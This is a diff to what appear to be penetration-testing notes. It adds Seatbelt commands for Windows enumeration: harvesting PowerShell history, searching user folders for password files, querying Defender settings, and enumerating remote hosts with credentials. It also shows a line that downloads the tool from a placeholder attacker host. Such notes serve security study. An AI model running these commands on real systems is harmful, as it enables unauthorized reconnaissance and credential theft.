@@ -984,6 +984,8 @@ e.g interesting output
 
 
 ```powershell
+# https://docs.specterops.io/ghostpack-docs/Seatbelt-mdx/overview
+
 iwr -uri http://attacker_ip/enum/Seatbelt.exe -outfile Seatbelt.exe
 
 # Run all checks:
@@ -993,6 +995,41 @@ iwr -uri http://attacker_ip/enum/Seatbelt.exe -outfile Seatbelt.exe
 .\Seatbelt.exe -group=user
 .\Seatbelt.exe -group=system
 .\Seatbelt.exe -group=misc
+
+# Single command
+.\Seatbelt.exe OSInfo
+
+# Multiple commands
+.\Seatbelt.exe OSInfo LocalUsers AntiVirus
+
+# Command with full output (no filtering)
+.\Seatbelt.exe Processes -full
+
+# All system checks
+.\Seatbelt.exe -group=system
+
+# All checks with full output
+.\Seatbelt.exe -group=all -full
+
+# All checks except specific commands
+.\Seatbelt.exe -group=all -AuditPolicies -Hotfixes
+
+# powershell history console history
+Seatbelt.exe PowerShellHistory
+
+# Logon events for last 30 days
+.\Seatbelt.exe "LogonEvents 30"
+
+# Directory listing with depth and regex
+.\Seatbelt.exe "dir C:\Users 3 .*password.* false"
+
+# Registry query with depth and regex
+.\Seatbelt.exe "reg \"HKLM\SOFTWARE\Microsoft\Windows Defender\" 3 .*defini.* true"
+
+# Remote Enumeration
+.\Seatbelt.exe OSInfo -computername=192.168.1.100
+.\Seatbelt.exe -group=remote -computername=DC01.domain.com -username=DOMAIN\user -password="P@ssw0rd"
+.\Seatbelt.exe -group=remote -computername=TARGET
 ```
 
 e.g interesting output
